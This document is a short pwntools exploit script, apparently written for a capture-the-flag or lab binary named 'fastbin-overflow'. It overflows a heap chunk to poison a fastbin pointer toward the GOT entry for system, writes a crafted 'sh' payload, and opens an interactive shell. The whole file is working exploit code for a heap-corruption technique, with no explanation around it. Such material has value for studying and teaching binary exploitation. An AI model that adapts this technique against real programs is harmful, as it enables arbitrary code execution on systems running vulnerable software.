#!/usr/bin/env python
from pwn import *
p = process('./fastbin-overflow')
elf = ELF('./fastbin-overflow')

def cmd(x):
	p.recvuntil('>')
	p.sendline(x)

def malloc(i, size, s):
	cmd('1 {} {}\n{}'.format(str(i), str(size), s))

def free(i):
	cmd('2 {}'.format(str(i)))

def puts(i):
	cmd('3 {}'.format(str(i)))

system_got = elf.got['system']
sh = elf.symbols['sh']
gdb.attach(p)
malloc(0, 56, '\x00')
malloc(1, 56, '\x00')
free(1)
free(0)
malloc(2, 56, '\x00' * 56 + p64(0x41) + p64(system_got - 6))
malloc(3, 56, '\x00')
payload = 'sh' + 20 * '\x00' + p64(sh)
malloc(4, 56, payload)
malloc(4, system_got + 10, '\x00')
p.interactive()
